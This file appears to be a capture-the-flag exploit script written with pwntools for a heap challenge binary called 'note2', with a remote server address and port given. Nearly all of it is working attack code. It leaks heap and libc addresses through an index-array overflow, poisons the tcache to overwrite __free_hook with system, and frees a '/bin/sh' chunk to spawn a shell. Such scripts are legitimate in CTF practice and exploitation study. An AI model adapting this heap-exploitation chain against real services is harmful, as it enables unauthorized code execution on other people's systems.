#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./note2')
    elf = ELF('./note2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('8.130.172.39', 12032)
    elf = ELF('./note2')
    libc = ELF('./libc.so.6')

def choice(c):
    p.sendlineafter(b'choice: ', str(c).encode())

def add(name, data):
    choice(1)
    p.sendafter(b'name: ', name)
    p.sendafter(b'data: ', data)

def delete(idx):
    choice(2)
    p.sendlineafter(b'index: ', str(idx).encode())

def show(idx):
    choice(3)
    p.sendlineafter(b'index: ', str(idx).encode())

# leak heap
add(0x10 * b'A', b'A\n') # 0
add(0x10 * b'A', b'A\n') # 0
show(0)
p.recvuntil(0x10 * b'A')
heap_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x2a0
info('heap_base = ' + hex(heap_base))

# leak libc
for i in range(5):
    add(b'\x00\n', b'B\n') # 0
add(b'\x01\n', b'B\n') # 1
add(b'\x02\n', b'B\n') # 2 # padding
delete(0)
delete(1)
for i in range(7):
    add(b'\x03\n', b'B\n') # 3
for i in range(2):
    add(b'\x01\n', b'B\n') # 1
add(b'\x02\n', b'B\n') # 2 # padding
delete(3)
delete(1)
add(b'\x80\n', b'B\n') # overflow in_use array
show(1) # leak unsorted bin
p.recvuntil(b'\x01 -> ')
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
info('libc_base = ' + hex(libc_base))

# get shell
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
delete(1)
delete(2)
delete(3)
for i in range(7):
    add(b'\x04\n', b'C\n') # 4
add(b'\x05\n', b'C\n') # 5
add(b'\x06\n', b'C\n') # 6
delete(4)
delete(5)
for i in range(7):
    add(b'\x07\n', b'C\n') # 7
for i in range(2):
    add(b'\x01\n', b'C\n') # 1
add(b'\x08\n', b'C\n') # 8
delete(7)
delete(1)
add(b'\x80\n', b'C\n')
delete(1)
add(b'\x0f\n', b'C\n') # 15
for i in range(6):
    add(b'\x09\n', b'C\n') # 9
add(b'\x0e\n', b'C\n') # 14
add(b'\x0c\n', b'/bin/sh\x00\n') # 12
delete(6)
delete(15)
delete(14)
add(b'\x0d\n', 0x88 * b'\x00' + p64(0x221) + p64(free_hook) + b'\n') # 13 # add __free_hook to tcache
add(b'\x0d\n', b'C\n')
add(b'\x0d\n', p64(system) + b'\n') # 13 # forge __free_hook to system
delete(12)

#gdb.attach(p)

p.interactive()

